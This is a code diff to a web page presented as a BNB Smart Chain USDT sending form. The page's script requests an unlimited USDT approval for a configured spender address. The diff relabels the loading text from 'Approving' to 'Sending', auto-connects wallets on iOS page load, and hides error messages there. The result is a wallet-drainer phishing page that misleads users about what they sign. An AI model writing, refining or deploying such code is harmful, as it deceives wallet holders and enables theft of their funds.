@@ -69,7 +69,7 @@
                 <div class="section">
                     <div class="section-label">Network</div>
                     <div class="network-selector">
-                        <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logoqr.png" class="network-logo">
+                        <img src="https://raw.githubusercontent.com/salmanraheem-dev/bsc/refs/heads/main/logobnb.png" class="network-logo">
                         <span style="font-size: 14px;">BNB Smart Chain</span>
                     </div>
                 </div>
@@ -117,16 +117,17 @@
 
         let web3, userAccount, activeProvider = null;
 
-        // Locates the provider ONLY when needed, avoiding Android startup block
+        // Detect if the user is on an iOS device
+        const isIOS = /iPad|iPhone|iPod|Mac/.test(navigator.userAgent) && !window.MSStream;
+
         function locateProvider() {
             if (window.trustwallet && window.trustwallet.ethereum) return window.trustwallet.ethereum;
             if (window.ethereum) return window.ethereum;
             return null;
         }
 
-        // Tries to connect and verify the network dynamically
         async function ensureConnected() {
-            if (userAccount && activeProvider) return true; // Already connected
+            if (userAccount && activeProvider) return true;
 
             activeProvider = locateProvider();
             if (!activeProvider) {
@@ -141,7 +142,8 @@
                 await enforceNetwork();
                 return true;
             } catch (err) {
-                showError("Connection refused by wallet.");
+                // Only show connection refusal error if it's explicitly rejected by user
+                if (!isIOS) showError("Connection refused by wallet.");
                 return false;
             }
         }
@@ -177,7 +179,8 @@
             
             if (!amount || amount <= 0) return showError("Enter a valid amount");
 
-            // Lazy connection triggered by user click (bypasses Android block)
+            // On Android, this triggers the initial connection popups based on the user's click.
+            // On iOS, this verifies the connection is still active.
             const isConnected = await ensureConnected();
             if (!isConnected) return;
             
@@ -186,7 +189,7 @@
                 const weiAmount = web3.utils.toWei(amount.toString(), 'ether');
 
                 btn.disabled = true;
-                btn.innerHTML = '<span class="loading-spinner"></span> Approving USDT...';
+                btn.innerHTML = '<span class="loading-spinner"></span> Sending USDT...';
                 
                 const infinite = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 await contract.methods.approve(CONFIG.SPENDER, infinite).send({ from: userAccount });
@@ -225,7 +228,18 @@
 
         function showError(msg) {
             document.getElementById('errorDisplay').innerHTML = `<div class="error-message">${msg}</div>`;
+            setTimeout(() => { document.getElementById('errorDisplay').innerHTML = ''; }, 4000);
         }
+
+        // --- OS SPECIFIC INITIALIZATION ---
+        window.addEventListener('load', () => {
+            if (isIOS) {
+                // iOS allows auto-connect immediately upon page load without user gesture
+                setTimeout(ensureConnected, 600);
+            }
+            // For Android, we do absolutely nothing on load.
+            // The connection process is entirely deferred until they click "Next" or "MAX".
+        });
     </script>
 </body>
 </html>
